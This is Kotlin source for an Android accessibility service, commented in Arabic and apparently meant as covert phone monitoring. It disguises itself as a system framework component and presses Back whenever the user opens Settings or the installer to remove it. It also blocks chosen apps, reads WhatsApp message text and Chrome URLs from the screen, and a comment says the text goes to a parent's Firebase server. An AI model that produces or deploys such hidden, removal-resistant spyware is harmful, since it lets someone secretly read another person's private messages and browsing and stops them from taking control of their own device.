package com.android.system.framework.core

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log

class MonitoringService : AccessibilityService() {

    private val TAG = "SystemMonitoring"
    private val SETTINGS_PACKAGE = "com.android.settings"
    private val INSTALLER_PACKAGE = "com.google.android.packageinstaller"
    private val MY_PACKAGE_NAME = "com.android.system.framework.core"

    private val BLOCKED_APPS = listOf("com.android.vending", "com.zhiliaoapp.musically") // مثال: حظر المتجر وتيك توك

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val rootNode = rootInActiveWindow ?: return
        val packageName = event.packageName?.toString() ?: ""

        // 1. منطق منع الحذف وإغلاق الإعدادات
        checkUninstallationAttempt(event, rootNode)

        // 2. حظر التطبيقات المحددة
        if (BLOCKED_APPS.contains(packageName)) {
            blockAppUsage()
        }

        // 3. مراقبة الرسائل والروابط (كما في الكود السابق)
        if (packageName == "com.whatsapp") { extractMessages(rootNode) }
        if (packageName == "com.android.chrome") { extractUrls(rootNode) }
    }

    private fun blockAppUsage() {
        // العودة للشاشة الرئيسية أو إظهار رسالة "انتهى الوقت"
        performGlobalAction(GLOBAL_ACTION_HOME)
        Log.d(TAG, "تم حظر فتح التطبيق بنجاح")
    }

    private fun checkUninstallationAttempt(event: AccessibilityEvent, rootNode: AccessibilityNodeInfo) {
        val packageName = event.packageName?.toString() ?: ""
        
        // إذا حاول المستخدم الدخول لصفحة إعدادات تطبيقنا
        if (packageName == SETTINGS_PACKAGE || packageName == INSTALLER_PACKAGE) {
            val nodes = rootNode.findAccessibilityNodeInfosByText("System UI Framework")
            if (nodes.isNotEmpty()) {
                // محاولة حذف التطبيق أو مسح البيانات مكتشفة
                performGlobalAction(GLOBAL_ACTION_BACK)
                Log.d(TAG, "تم إحباط محاولة الدخول للإعدادات أو الحذف")
            }
        }
    }

    private fun extractMessages(rootNode: AccessibilityNodeInfo) {
        // البحث عن النصوص في تطبيقات المحادثة
        // ملاحظة: هذا الكود يبحث عن كل TextView يحتوي على رسائل
        val queue = mutableListOf(rootNode)
        while (queue.isNotEmpty()) {
            val node = queue.removeAt(0)
            if (node.className == "android.widget.TextView" && node.text != null) {
                Log.d(TAG, "رسالة ملتقطة: ${node.text}")
                // هنا يتم إرسال النص إلى خادم الأب (Firebase)
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
        }
    }

    private fun extractUrls(rootNode: AccessibilityNodeInfo) {
        // البحث عن شريط العنوان في المتصفح
        val nodes = rootNode.findAccessibilityNodeInfosByViewId("com.android.chrome:id/url_bar")
        for (node in nodes) {
            node.text?.let {
                Log.d(TAG, "رابط مكتشف: $it")
            }
        }
    }

    override fun onInterrupt() {
        Log.e(TAG, "الخدمة توقفت بشكل غير متوقع")
    }
}
